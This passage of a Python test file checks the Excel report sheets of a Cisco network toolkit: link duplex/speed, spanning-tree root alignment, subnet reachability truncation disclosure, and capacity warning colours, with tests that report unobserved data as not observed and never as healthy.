    seen = {"A": {"Gi1/1": up("Gi1/1", "B", "Gi1/1", duplex="full", speed="1000")},
            "B": {"Gi1/1": up("Gi1/1", "A", "Gi1/1", duplex="half", speed="1000")}}
    wb2 = harden_workbook(Workbook())
    write_link_phy_sheet(wb2, seen)
    p2 = tmp_path / "seen.xlsx"
    wb2.save(str(p2))
    ws = load_workbook(str(p2))["Link Duplex-Speed"]
    assert ws.cell(2, 2).value == "duplex", [ws.cell(2, c).value for c in range(1, 5)]
    assert ws.cell(3, 1).value == "coverage"
    assert "1 inter-switch link(s) with both ends collected were compared" in ws.cell(3, 2).value


def test_stp_roots_never_claims_aligned_for_a_vlan_it_could_not_compare(tmp_path):
    """[XL2-4] `stp_root_findings` ABSTAINS twice: on an MST record (both checks are PVST/RPVST-only) and
    on a VLAN with no collected gateway SVI (it cannot be 'misaligned' with nothing). The sheet read those
    abstentions as an empty findings list and printed the CLEAN value -- 'Aligned? = yes' and
    'Accidental root? = no'. On an access-only collection that is a fabricated 'aligned' on every row
    (observed exactly so in a shipped deliverable). Absence of evidence is never health."""
    from cisco_toolkit.excel import HEALTH_NOT_OBSERVED, STP_ROOTS_SHEET_NAME, write_stp_roots_sheet

    roots = {"SW-A": {"10": {"is_root": True, "root_priority": 32778},      # no gateway collected anywhere
                      "20": {"is_root": True, "root_priority": 4096},       # root IS the gateway -> aligned
                      "30": {"is_root": True, "root_priority": 8192}},      # gateway elsewhere -> misaligned
             "SW-B": {"0": {"is_root": True, "root_priority": 32768, "is_mst": True}}}
    ifaces = {"SW-A": {"Vlan20": _iface("Vlan20", svi_ip="10.0.20.1 255.255.255.0")},
              "SW-C": {"Vlan30": _iface("Vlan30", svi_ip="10.0.30.1 255.255.255.0")}}
    wb = harden_workbook(Workbook())
    write_stp_roots_sheet(wb, roots, ifaces)
    p = tmp_path / "stp.xlsx"
    wb.save(str(p))
    ws = load_workbook(str(p))[STP_ROOTS_SHEET_NAME]
    got = {str(ws.cell(r, 1).value): [ws.cell(r, c).value for c in range(1, 7)]
           for r in range(2, ws.max_row + 1)}
    # VLAN 10: nothing to compare against -> abstain, never "yes"
    assert got["10"][5] == HEALTH_NOT_OBSERVED, got["10"]
    assert "no gateway SVI collected" in got["10"][4], got["10"]
    # MST instance: analyze evaluated NEITHER verdict -> both columns abstain
    assert got["0"][3] == HEALTH_NOT_OBSERVED and got["0"][5] == HEALTH_NOT_OBSERVED, got["0"]
    # the two genuinely-evaluated cases are unchanged (this is not just asserting NOT OBSERVED everywhere)
    assert got["20"][5] == "yes" and got["20"][4] == "SW-A", got["20"]
    assert got["30"][5] == "no - root != gateway" and got["30"][4] == "SW-C", got["30"]
    # and an MST abstention is never painted with the colour of a real result
    mst_row = [r for r in range(2, ws.max_row + 1) if str(ws.cell(r, 1).value) == "0"][0]
    assert str(ws.cell(mst_row, 6).fill.fgColor.rgb).endswith("EFEFEF"), ws.cell(mst_row, 6).fill.fgColor.rgb


def test_subnet_reachability_discloses_the_served_subnet_cut(tmp_path):
    """[XL2-5] The 'L2: subnets via gateway' join sliced `served_subnets[:8]` with NO disclosure, while the
    destination-subnet join two lines above used the '(+N)' pattern -- the same pattern this module's
    32,767-char cell guard cites as the house rule, naming THIS sheet. For an access switch that column is
    the whole answer to 'which subnets do my endpoints live in': a silent cut is a coverage lie."""
    from cisco_toolkit.excel import SUBNET_REACH_SHEET_NAME, write_subnet_reachability_sheet

    def dev(host, n):
        return {"host": host, "is_l3": False, "destination_subnets": [], "destination_count": 0,
                "reachable_count": 0, "reachable_sources": {}, "default_next_hop": "",
                "bgp_received_count": 0,
                "served_subnets": [{"subnet": "192.168.%d.0/24" % i, "gateway": "CORE-%d" % i}
                                   for i in range(n)]}

    wb = harden_workbook(Workbook())
    write_subnet_reachability_sheet(wb, {"per_device": [dev("ACC-1", 20), dev("ACC-2", 8)]})
    p = tmp_path / "subnet.xlsx"
    wb.save(str(p))
    ws = load_workbook(str(p))[SUBNET_REACH_SHEET_NAME]
    cut = ws.cell(2, 8).value
    assert cut.endswith(" (+12)"), cut                 # 20 given, 8 shown, the other 12 DISCLOSED
    assert cut.count(";") == 7, cut                    # still 8 rendered entries
    exact8 = ws.cell(3, 8).value                       # exactly 8 -> nothing was cut -> no marker
    assert "(+" not in exact8 and exact8.count(";") == 7, exact8


def test_capacity_warn_fill_only_colours_the_axis_that_is_bound(tmp_path):
    """[XL2-6] A colour is a claim. `if flags and col in (6, 10)` amber-filled BOTH utilisation cells
    whenever EITHER flag fired, so a PoE-bound switch at 8% port utilisation read 'port-bound' -- and a
    switch whose active_ports was never observed got the amber over the BLANK cell that exists precisely
    to withhold that claim (review #55)."""
    from cisco_toolkit.excel import CAPACITY_SHEET_NAME, write_capacity_sheet
    from cisco_toolkit.model import DevicePhysical

    def dp(host, total, active, cap, drawn):
        d = DevicePhysical(hostname=host)
        d.model, d.total_ports, d.active_ports = "C9300-48P", total, active
        d.power_capacity_w, d.power_drawn_w = cap, drawn
        return d

    wb = harden_workbook(Workbook())
    write_capacity_sheet(wb, [dp("POE-ONLY", 48, 4, "740", "700"),        # 8% ports, 95% PoE
                              dp("PORTS-UNKNOWN", 48, None, "740", "700"),
                              dp("PORT-ONLY", 48, 46, "740", "100")])     # 96% ports, 14% PoE
    p = tmp_path / "cap.xlsx"
    wb.save(str(p))
    ws = load_workbook(str(p))[CAPACITY_SHEET_NAME]

    def amber(cell):
        return str(cell.fill.fgColor.rgb).endswith("FCE5CD")

    seen = {ws.cell(r, 1).value: (amber(ws.cell(r, 6)), amber(ws.cell(r, 10)), ws.cell(r, 6).value)
            for r in range(2, 5)}
    assert seen["POE-ONLY"] [:2] == (False, True), seen["POE-ONLY"]
    assert seen["PORT-ONLY"][:2] == (True, False), seen["PORT-ONLY"]
    # not-observed port utilisation: blank cell, and NO colour claiming anything about it
    assert seen["PORTS-UNKNOWN"] == (False, True, None), seen["PORTS-UNKNOWN"]
